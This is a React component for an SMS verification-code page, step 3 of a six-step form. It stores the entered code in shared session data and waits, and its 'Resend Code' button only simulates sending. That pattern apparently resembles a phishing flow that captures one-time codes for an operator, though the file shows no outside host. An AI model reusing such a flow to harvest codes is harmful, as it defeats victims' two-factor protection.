import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { RefreshCw } from 'lucide-react';
import FormLayout from '@/components/FormLayout';
import ErrorAlert from '@/components/ErrorAlert';
import { useForm } from '@/contexts/FormContext';

const SmsOtpPage = () => {
  const [smsCode, setSmsCode] = useState('');
  const [isResending, setIsResending] = useState(false);
  const { updateSessionData, setWaiting } = useForm();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    updateSessionData('smsOtp', { smsCode });
    setWaiting(true);
  };

  const handleResendCode = async () => {
    setIsResending(true);
    // Simulate API call
    setTimeout(() => {
      setIsResending(false);
    }, 2000);
  };

  return (
    <FormLayout 
      title="SMS Verification" 
      description="Enter the verification code sent to your mobile device to continue."
      currentStep={3}
      totalSteps={6}
    >
      <ErrorAlert />
      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <Label htmlFor="smsCode">SMS Verification Code</Label>
          <div className="relative">
            <Input
              id="smsCode"
              value={smsCode}
              onChange={(e) => setSmsCode(e.target.value.toUpperCase())}
              className="text-center text-lg font-mono tracking-widest"
              placeholder="Enter 6-digit code"
              maxLength={6}
              pattern="[A-Z0-9]{6}"
              required
            />
          </div>
          <div className="text-center">
            <Button 
              type="button" 
              variant="ghost" 
              size="sm"
              onClick={handleResendCode}
              disabled={isResending}
              className="text-sm text-muted-foreground hover:text-foreground"
            >
              {isResending ? (
                <>
                  <RefreshCw className="h-3 w-3 mr-1 animate-spin" />
                  Sending...
                </>
              ) : (
                'Resend Code'
              )}
            </Button>
          </div>
        </div>

        <div className="bg-muted/50 p-4 rounded-lg">
          <p className="text-sm text-muted-foreground">
            <strong>Note:</strong> If you haven't received the SMS within 2 minutes, please check your phone number and try resending the code.
          </p>
        </div>

        <Button 
          type="submit" 
          className={`w-full transition-all ${
            smsCode.length === 6 
              ? 'bg-[hsl(0,100%,45%)] hover:bg-[hsl(0,100%,40%)]' 
              : ''
          }`}
          disabled={smsCode.length !== 6}
        >
          Verify Code
        </Button>
      </form>
    </FormLayout>
  );
};

export default SmsOtpPage;